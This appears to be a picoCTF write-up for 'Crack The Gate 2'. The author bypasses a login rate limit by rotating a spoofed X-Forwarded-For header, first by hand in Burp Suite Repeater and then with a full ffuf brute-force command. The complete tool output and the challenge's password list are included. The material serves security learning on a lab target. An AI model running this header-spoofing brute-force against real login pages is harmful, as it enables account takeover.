# Crack The Gate 2 | picoCTF

## Description

The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.

## Analysis

At first I tried to inspect the page to find potential hints for this CTF but there was nothing. Then, then I tried to enter some random password for user `ctf-player@picoctf.org` to see the output. After wrong password we get output saying wrong credentials and that we have to wait for 20 minutes:

![](images/20min.jpg)

After seeing this output I opened **Burp Suite** to see the request we are sending:

![](images/interception.jpg)

As you can see there is nothing special in this section. At this moment I though that I can use Burp Suite Repeater to bypass this "20 minutes" limit. All we need to do is to capture the request using Interception. After capturing the request, we need to right click to it, and choose option "Send to Repeater". Now we need to switch to Repeater tab on the top.

## Solution
After switching to Repeater tab, we can send as many requests as we want. Because our `passwords.txt` file consists only of 20 passwords, we can just type manually them to find the correct one:

![](images/false.jpg)

This is the first "Send". Now all we need to do is to find the correct one:

![](images/true.jpg)

That's it. We solved the current CTF!

### Optionally

We can also use `ffuf` command to brute-force the current login form using the following command:
```bash
ffuf -X POST -u http://amiable-citadel.picoctf.net:59192/login -d '{"email":"ctf-player@picoctf.org","password":"FUZZ1"}' -H "X-Forwarded-For: 10.10.10.FUZZ2" -w ~/Downloads/passwords.txt:FUZZ1 -w num.txt:FUZZ2 -mc all -mode pitchfork -H "Content-Type: application/json"
```
The key points of this command are:
* `-H "X-Forwarded-For: 10.10.10.FUZZ2"` => HTTP header used to identify client's originating IP address through a proxy or load balancer.
* `-mode pitchfork` => the `num.txt` file has numbers from 1 to 20. By default `ffuf` uses **clusterbomb** mode, where it would have try to match each number with all passwords. However, we do not need that, for us one number per password is completely enough. `-mode pitchfork` maps two worldlists correspondigly: first password with first number, second password with second number, etc.

After running this command we get the following output:
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -X POST -u http://amiable-citadel.picoctf.net:59192/login -d '{"email":"ctf-player@picoctf.org","password":"FUZZ1"}' -H "X-Forwarded-For: 10.10.10.FUZZ2" -w ~/Downloads/passwords.txt:FUZZ1 -w num.txt:FUZZ2 -mc all -mode pitchfork -H "Content-Type: application/json"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://amiable-citadel.picoctf.net:59192/login
 :: Wordlist         : FUZZ1: /home/kali/Downloads/passwords.txt
 :: Wordlist         : FUZZ2: /home/kali/num.txt
 :: Header           : X-Forwarded-For: 10.10.10.FUZZ2
 :: Header           : Content-Type: application/json
 :: Data             : {"email":"ctf-player@picoctf.org","password":"FUZZ1"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 190ms]
    * FUZZ1: UToyxdBs
    * FUZZ2: 16

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 191ms]
    * FUZZ1: SooyOtMf
    * FUZZ2: 12

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 187ms]
    * FUZZ1: tfkwkm3g
    * FUZZ2: 15

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 188ms]
    * FUZZ1: wqMh5SQT
    * FUZZ2: 3

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 182ms]
    * FUZZ1: jcEoe8hx
    * FUZZ2: 20

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 180ms]
    * FUZZ1: 5vcxz5xZ
    * FUZZ2: 11

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 188ms]
    * FUZZ1: 0AwkENeB
    * FUZZ2: 14

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 189ms]
    * FUZZ1: NT4Vm1FC
    * FUZZ2: 9

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 177ms]
    * FUZZ1: xAzOtoGy
    * FUZZ2: 8

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 177ms]
    * FUZZ1: aRhrp17j
    * FUZZ2: 10

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 190ms]
    * FUZZ1: NWj5rDBm
    * FUZZ2: 17

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 188ms]
    * FUZZ1: qpTlHqaG
    * FUZZ2: 13

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 179ms]
    * FUZZ1: 9JL7BM3W
    * FUZZ2: 4

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 178ms]
    * FUZZ1: xr5N5yun
    * FUZZ2: 6

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 187ms]
    * FUZZ1: l9xKfsH0
    * FUZZ2: 1

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 187ms]
    * FUZZ1: FAfQ34Dr
    * FUZZ2: 7

[Status: 200, Size: 132, Words: 1, Lines: 1, Duration: 191ms]
    * FUZZ1: rCRnekkE
    * FUZZ2: 2

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 193ms]
    * FUZZ1: LiVR9e3g
    * FUZZ2: 18

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 194ms]
    * FUZZ1: 3v6avTIP
    * FUZZ2: 19

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 193ms]
    * FUZZ1: OtrkErZU
    * FUZZ2: 5

:: Progress: [20/20] :: Job [1/1] :: 26 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

As you can see, the correct password has different size than the other failed attempts. We found the password for user and solved CTF!
